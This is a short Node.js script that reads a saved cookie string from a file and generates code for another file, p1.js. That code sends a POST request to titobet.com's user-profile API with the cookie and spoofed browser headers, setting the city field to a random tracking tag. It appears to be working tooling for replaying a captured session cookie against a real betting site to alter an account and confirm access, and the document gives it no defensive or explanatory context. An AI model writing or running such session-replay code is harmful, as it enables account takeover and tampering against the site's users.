const fs=require('fs');
const ck=fs.readFileSync('..\\ck.txt','utf8');
const tag='WX'+Math.floor(Math.random()*90000+10000);
const code=`
const https=require('https');
const body=JSON.stringify({city:'${tag}'});
const H={'content-type':'application/json','content-length':Buffer.byteLength(body),cookie:${JSON.stringify(ck)},'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',origin:'https://titobet.com',referer:'https://titobet.com/tr','accept':'application/json, text/plain, */*','accept-language':'tr-TR,tr;q=0.9,en;q=0.8'};
const r=https.request({host:'titobet.com',port:443,path:'/api/user/profile',method:'POST',headers:H,timeout:9000},res=>{res.resume();console.log(res.statusCode)});
r.on('error',e=>console.log('E'));r.on('timeout',()=>{r.destroy();console.log('T')});r.write(body);r.end();
`;
let t=fs.readFileSync('p1.js','utf8');
t=t.replace(/const CODE=.*\n/, 'const CODE='+JSON.stringify(code)+'\n');
fs.writeFileSync('p1.js',t);console.log('tag='+tag);
